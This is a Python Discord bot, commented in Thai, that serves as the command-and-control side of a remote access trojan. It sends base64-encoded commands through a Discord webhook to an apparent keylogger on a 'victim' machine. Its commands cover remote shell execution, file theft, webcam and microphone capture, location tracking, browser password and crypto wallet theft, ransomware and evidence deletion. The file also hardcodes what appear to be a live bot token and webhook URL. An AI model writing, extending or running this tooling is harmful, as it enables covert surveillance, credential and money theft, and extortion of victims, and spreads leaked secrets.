# ================================================================
# DISCORD BOT - ควบคุม System Tool (Python)
# ================================================================

import discord
from discord.ext import commands
import requests
import json
import time
import base64
import os

# ==================== ตั้งค่า ====================
BOT_TOKEN = "MTU0MjQyODQ3MzU2MDI3NzA4Mg.G_4tmv.ocM3i7kc2U6jZbI6ltlLjTrDYrYclP-6qvLJA8"  # ใส่ Bot Token ของคุณ
WEBHOOK_URL = "https://discord.com/api/webhooks/1542430511098757150/Zt6Sz6JjaYllVQHjZ2GR93Wtvk-kdE_NBPVo2QUnHlB_5Qr1I5M8V4fUeoMnNF8poZ-Y"
# ===============================================

# ตั้งค่า Intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

def send_command_to_victim(command, parameter=""):
    """ส่งคำสั่งไปยัง Key Logger ผ่าน Webhook"""
    try:
        # เข้ารหัสพารามิเตอร์ด้วย Base64 (เหมือน Java)
        encoded = base64.b64encode(parameter.encode('utf-8')).decode('utf-8')
        content = f"```\n[COMMAND]\n{command}\n{encoded}\n```"
        
        data = {"content": content}
        response = requests.post(WEBHOOK_URL, json=data, timeout=5)
        return response.status_code == 204 or response.status_code == 200
    except Exception as e:
        print(f"[!] ส่งคำสั่งล้มเหลว: {e}")
        return False

@bot.event
async def on_ready():
    print("=" * 50)
    print("✅ Bot Online!")
    print(f"📌 Name: {bot.user}")
    print(f"📌 ID: {bot.user.id}")
    print("=" * 50)
    
    await bot.change_presence(activity=discord.Game(name="!help | 1818"))

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if bot.user in message.mentions:
        await message.channel.send(f"👋 สวัสดี {message.author.mention}! พิมพ์ `!help` เพื่อดูคำสั่ง")
    
    await bot.process_commands(message)

# ==================== คำสั่ง ====================

@bot.command(name='help')
async def help_command(ctx):
    """แสดงคำสั่งทั้งหมด"""
    help_text = """
📋 **Commands:**

**📸 Screenshot:**
`!screenshot` - จับภาพหน้าจอ

**🔒 Lock / Unlock:**
`!lock` - ล็อกหน้าจอ
`!unlock` - ปลดล็อกหน้าจอ

**💻 Remote Control:**
`!cmd <command>` - รันคำสั่ง CMD
`!ls <path>` - แสดงรายการไฟล์
`!download <path>` - ดาวน์โหลดไฟล์

**📷 Webcam / Audio:**
`!webcam` - ถ่ายรูปเว็บแคม
`!record` - บันทึกเสียง (10วินาที)

**🗺️ Location:**
`!map` - แสดงตำแหน่ง GPS

**💾 Stealer:**
`!usb` - USB Stealer
`!browser` - ขโมยรหัสผ่านเบราว์เซอร์
`!crypto` - ขโมย Crypto Wallet

**🔴 Ransomware:**
`!ransom` - Ransomware จำลอง

**🧹 System:**
`!delete_evidence` - ลบหลักฐานทั้งหมด

**📨 Message:**
`!msg <ข้อความ>` - ส่งข้อความไปหาเหยื่อ

🔑 **Password:** `1818`
"""
    await ctx.send(help_text)

@bot.command(name='ping')
async def ping(ctx):
    """ตรวจสอบ Bot"""
    latency = round(bot.latency * 1000)
    await ctx.send(f'🏓 Pong! {latency}ms')

@bot.command(name='msg')
async def send_message(ctx, *, message):
    """ส่งข้อความไปหาเหยื่อ !msg สวัสดี"""
    if send_command_to_victim("msg", message):
        await ctx.send(f"📨 กำลังส่งข้อความ: **{message[:50]}**...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='screenshot')
async def take_screenshot(ctx):
    """จับภาพหน้าจอ !screenshot"""
    if send_command_to_victim("screenshot"):
        await ctx.send("📸 กำลังจับภาพหน้าจอ...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='lock')
async def lock_screen(ctx):
    """ล็อกหน้าจอ !lock"""
    if send_command_to_victim("lock"):
        await ctx.send("🔒 กำลังล็อกหน้าจอ...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='unlock')
async def unlock_screen(ctx):
    """ปลดล็อกหน้าจอ !unlock"""
    if send_command_to_victim("unlock"):
        await ctx.send("🔓 กำลังปลดล็อก...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='delete_evidence')
async def delete_evidence(ctx):
    """ลบหลักฐานทั้งหมด !delete_evidence"""
    if send_command_to_victim("delete_evidence"):
        await ctx.send("🧹 กำลังลบหลักฐานทั้งหมด...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='cmd')
async def run_command(ctx, *, command):
    """รันคำสั่ง CMD !cmd ipconfig"""
    if send_command_to_victim("cmd", command):
        await ctx.send(f"💻 กำลังรัน: `{command}`...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='ls')
async def list_files(ctx, path="C:\\"):
    """แสดงรายการไฟล์ !ls C:\Users"""
    if send_command_to_victim("ls", path):
        await ctx.send(f"📂 กำลังแสดงรายการไฟล์ใน `{path}`...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='download')
async def download_file(ctx, path):
    """ดาวน์โหลดไฟล์ !download C:\file.txt"""
    if send_command_to_victim("download", path):
        await ctx.send(f"📥 กำลังดาวน์โหลด: `{path}`...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='webcam')
async def capture_webcam(ctx):
    """ถ่ายรูปเว็บแคม !webcam"""
    if send_command_to_victim("webcam"):
        await ctx.send("📷 กำลังถ่ายรูปเว็บแคม...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='record')
async def record_audio(ctx):
    """บันทึกเสียง !record"""
    if send_command_to_victim("record"):
        await ctx.send("🎤 กำลังบันทึกเสียง...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='map')
async def get_location(ctx):
    """แสดงตำแหน่ง GPS !map"""
    if send_command_to_victim("map"):
        await ctx.send("🗺️ กำลังหาตำแหน่ง...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='usb')
async def steal_usb(ctx):
    """USB Stealer !usb"""
    if send_command_to_victim("usb"):
        await ctx.send("💾 กำลัง USB Stealer...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='browser')
async def steal_browser(ctx):
    """ขโมยรหัสผ่านเบราว์เซอร์ !browser"""
    if send_command_to_victim("browser"):
        await ctx.send("🔑 กำลังขโมยรหัสผ่าน...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='crypto')
async def steal_crypto(ctx):
    """ขโมย Crypto Wallet !crypto"""
    if send_command_to_victim("crypto"):
        await ctx.send("💰 กำลังขโมย Crypto Wallet...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

@bot.command(name='ransom')
async def ransomware(ctx):
    """Ransomware จำลอง !ransom"""
    if send_command_to_victim("ransom"):
        await ctx.send("🔴 กำลังรัน Ransomware...")
    else:
        await ctx.send("❌ ไม่สามารถส่งคำสั่งได้")

# ==================== เริ่ม Bot ====================

if __name__ == "__main__":
    print("=" * 50)
    print("🤖 DISCORD BOT - SYSTEM CONTROLLER")
    print("=" * 50)
    print(f"🔑 รหัสปลดล็อก: 1818")
    print(f"📌 พิมพ์ !help ใน Discord เพื่อดูคำสั่ง")
    print("=" * 50)
    
    if BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
        print("⚠️ กรุณาใส่ BOT_TOKEN ในไฟล์!")
        input("กด Enter เพื่อออก...")
        exit()
    
    try:
        bot.run(BOT_TOKEN)
    except discord.LoginFailure:
        print("❌ Token ไม่ถูกต้อง!")
        input("กด Enter เพื่อออก...")
    except Exception as e:
        print(f"❌ เกิดข้อผิดพลาด: {e}")
        input("กด Enter เพื่อออก...")